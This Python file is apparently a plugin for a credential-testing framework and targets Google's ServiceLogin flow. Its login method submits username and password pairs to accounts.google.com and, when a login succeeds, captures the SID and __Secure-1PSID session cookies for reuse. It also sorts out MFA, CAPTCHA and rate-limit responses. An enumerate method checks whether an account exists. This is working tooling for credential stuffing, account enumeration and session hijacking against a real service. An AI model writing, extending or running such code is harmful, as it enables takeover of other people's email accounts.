"""Google — ServiceLogin flow. SID cookie is the only proof."""
from __future__ import annotations

import re
import time

from .interface import AuthResult, EnumerateResult, LoginResult, SessionData, WebPlugin

_HIDDEN = re.compile(r'<input[^>]+name=["\'](GALX|dsh)["\'][^>]*value=["\']([^"\']*)', re.I)


class GmailPlugin(WebPlugin):
    name, domain = "gmail", "accounts.google.com"
    auth_cookies = ("SID", "__Secure-1PSID")

    def login(self, username, password, client):
        started = time.monotonic()
        def done(result, message="", session=None):
            return LoginResult(result=result, username=username, password=password,
                               message=message,
                               response_time_ms=(time.monotonic() - started) * 1000,
                               session=session)
        page = client.get("https://accounts.google.com/ServiceLogin"
                          "?continue=https://mail.google.com")
        html = page.text or ""
        hidden = dict(_HIDDEN.findall(html))
        if not hidden.get("GALX"):
            return done(AuthResult.ERROR, "no GALX — JS-only flow")
        resp = client.post("https://accounts.google.com/ServiceLoginAuth",
                           data={"Email": username, "Passwd": password,
                                 "GALX": hidden["GALX"],
                                 "dsh": hidden.get("dsh", ""),
                                 "continue": "https://mail.google.com",
                                 "service": "mail", "hl": "en"})
        body = (resp.text or "").lower()
        if any(c.lower() in dict(client.cookie_dict()) for c in self.auth_cookies):
            return done(AuthResult.SUCCESS, "login successful",
                        SessionData(cookies=dict(client.cookie_dict()),
                                    user_agent=client.user_agent))
        if "/challenge/" in str(resp.url) or "2-step" in body or "verify" in body:
            return done(AuthResult.MFA, "challenge page")
        if "captcha" in body or "unusual traffic" in body:
            return done(AuthResult.CAPTCHA, "captcha")
        if "wrong password" in body or "couldn't find" in body or "couldn" in body:
            return done(AuthResult.FAILURE, "invalid credentials")
        return done(AuthResult.UNKNOWN, f"http {resp.status}")

    def enumerate(self, username, client):
        page = client.get("https://accounts.google.com/ServiceLogin"
                          "?continue=https://mail.google.com")
        html = page.text or ""
        hidden = dict(_HIDDEN.findall(html))
        if not hidden.get("GALX"):
            return EnumerateResult(username)
        resp = client.post("https://accounts.google.com/ServiceLoginAuth",
                           data={"Email": username, "GALX": hidden["GALX"],
                                 "dsh": hidden.get("dsh", ""), "hl": "en"})
        if "Passwd" in (resp.text or ""):
            return EnumerateResult(username, True, 0.7, ["password step reached"])
        return EnumerateResult(username)
